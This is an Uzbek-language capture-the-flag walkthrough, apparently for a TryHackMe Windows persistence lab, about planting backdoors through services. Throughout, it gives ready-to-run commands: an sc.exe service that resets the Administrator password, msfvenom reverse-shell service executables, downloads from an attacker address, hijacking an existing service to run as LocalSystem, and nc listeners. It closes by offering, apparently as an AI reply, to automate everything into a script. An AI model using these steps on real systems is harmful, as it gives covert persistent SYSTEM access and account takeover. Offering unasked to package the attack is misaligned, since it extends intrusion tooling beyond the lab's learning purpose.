

## 🎯 Maqsad:

1. **Yangi xizmat (service) yaratish** orqali tizimda orqa eshik (backdoor) o‘rnatish.
2. **Mavjud xizmatni o‘zgartirish** orqali aniqlanmasdan orqa eshikni ishga tushirish.
3. Har safar tizim yoqilganda, **payload avtomatik ishlaydi** va sizga shell qaytadi.

---

## 🔧 1. ✅ YANGI SERVICE YARATISH

### 🧨 Oddiy parolni o‘zgartirish xizmati

```cmd
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

🔑 Natija:

* Administrator foydalanuvchisining paroli `Passwd123` ga o‘zgaradi
* Har safar kompyuter yoqilganda bu buyruq avtomatik ishlaydi

---

### 🧨 Reverse shell xizmatini yaratish

#### 🛠 `msfvenom` yordamida shell yarating:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

> `YOUR_IP` o‘rniga o‘z AttackBox IP manzilingizni yozing.

#### 📁 Faylni nishon tizimga (C:\Windows) yuklang
Yuklash:
```
Invoke-WebRequest -Uri "http://10.8.24.135/rev-svc.exe" -OutFile "C:\Windows\rev-svc.exe"
```
#### 🧰 Service yaratish va ishga tushurish:

```cmd
sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

### 📞 Listener ishga tushiring:

```bash
nc -lvp 4448
```

---

## 🏁 Flag olish:

Tizimga shell qaytgach:

```cmd
C:\flags\flag7.exe
```

---

## 🔧 2. ✅ MAVJUD SERVICE NI O‘ZGARTIRISH

### 🔍 Mavjud service’ni ko‘rish:

```cmd
sc.exe query state= all
```

> Sizga keraklisi: `THMService3` bo‘lishi kerak (STOPPED holatda)

---

### 📋 Xizmatni tekshirish:

```cmd
sc.exe qc THMService3
```

* `BINARY_PATH_NAME` — hozirgi executable yo‘li
* `START_TYPE` — `AUTO_START` bo‘lishi kerak
* `SERVICE_START_NAME` — `LocalSystem` bo‘lsa, SYSTEM huquqini olasiz

---

### 🧨 Yangi payload yaratamiz:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Yuklab, `C:\Windows\rev-svc2.exe` ga joylashtiring.
Yuklash:
```
Invoke-WebRequest -Uri "http://10.8.24.135/rev-svc.exe" -OutFile "C:\Windows\rev-svc2.exe"
```
---

### 🛠 Service’ni sozlash:

```cmd
sc.exe config THMService3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

---

### 🔁 Tekshirish:

```cmd
sc.exe qc THMService3
```

> E'tibor bering: `SERVICE_START_NAME : LocalSystem` bo‘lishi juda muhim — bu sizga **SYSTEM huquqida** shell qaytaradi.

---

### 📞 Listener oching:

```bash
nc -lvp 5558
```

---

## 🧩 Bonus: Service’ni keyin ishga tushiring

Agar tizim qayta ishga tushirilmasa:

```cmd
sc.exe start THMService3
```

---

## 🏁 THM Flag

Shell olganingizdan so‘ng:

```cmd
C:\flags\flag7.exe
```

---

## ✅ Xulosa jadvali:

| Qadam                                | Buyruq yoki vosita                                          |
| ------------------------------------ | ----------------------------------------------------------- |
| Yangi service – parolni o‘zgartirish | `sc.exe create ...` bilan `net user` buyruqlarini ishlatish |
| Yangi service – reverse shell        | `msfvenom` + `sc.exe create`                                |
| Mavjud service – hijack              | `sc.exe config` bilan `binPath`, `start`, `obj` ni sozlash  |
| Shell olish                          | `nc -lvp <port>`                                            |
| Flag olish                           | `C:\flags\flag7.exe`                                        |

---

Agar xohlasangiz, bu barcha bosqichlarni `.bat` faylga yoki `PowerShell` skriptga aylantirib avtomatiklashtirib beraman. Yordam kerakmi?
